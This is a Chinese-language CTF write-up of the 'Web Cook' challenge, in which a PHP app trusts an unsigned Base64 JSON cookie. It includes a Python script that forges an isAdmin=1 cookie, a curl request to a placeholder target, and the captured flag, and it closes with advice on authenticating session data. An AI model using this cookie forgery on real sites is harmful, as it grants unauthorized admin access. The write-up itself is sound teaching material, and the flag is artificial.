# Web Cook

## 题目简述

应用登录后设置名为 `session` 的 Cookie。它只是把包含用户名和管理员标志的 JSON 做 Base64 编码：

```php
$b64cookie = base64_encode(json_encode(array(
    "username" => $username,
    "isAdmin" => 0
)));
setcookie("session", $b64cookie);
```

服务端随后直接解码并信任 `isAdmin`，没有签名、MAC 或服务端 session 状态。Base64 只改变表示方式，不提供完整性保护，因此客户端可以任意篡改权限字段。

## 解题过程

普通用户的 Cookie 示例：

```text
eyJ1c2VybmFtZSI6InRlc3QiLCJpc0FkbWluIjowfQ==
```

解码后为：

```json
{"username":"test","isAdmin":0}
```

服务端只检查 JSON 恰有 `username`、`isAdmin` 两个键，且 `isAdmin` 等于 0 或 1：

```php
$session_data = json_decode(
    base64_decode($_COOKIE["session"]),
    true
);
$isAdmin = $session_data["isAdmin"];

if ($isAdmin != 0 && $isAdmin != 1) {
    die();
}
```

它没有验证这份数据是否由服务器生成。构造管理员 JSON 并重新编码：

```python
from base64 import b64encode
import json


session = {
    "username": "pwn",
    "isAdmin": 1,
}
cookie = b64encode(
    json.dumps(session, separators=(",", ":")).encode()
).decode()
print(cookie)
```

把输出作为请求 Cookie：

```bash
curl 'http://TARGET/' \
  -H 'Cookie: session=<forged-base64>'
```

服务端解码后读取到 `isAdmin = 1`，直接返回：

```text
N0PS{y0u_Kn0W_H0w_t0_c00K_n0W}
```

## 方法总结

- 核心技巧：修改 Base64 编码 JSON 中的 `isAdmin` 字段，伪造管理员 session。
- 识别信号：Cookie 解码后包含明文权限字段，服务端只校验格式和值域，不校验来源与完整性。
- 复用要点：客户端状态至少需要使用服务器秘密进行认证加密或消息认证；更常见的做法是 Cookie 仅保存随机 session ID，权限保留在服务端。编码、压缩和加密都不能自动替代完整性校验。
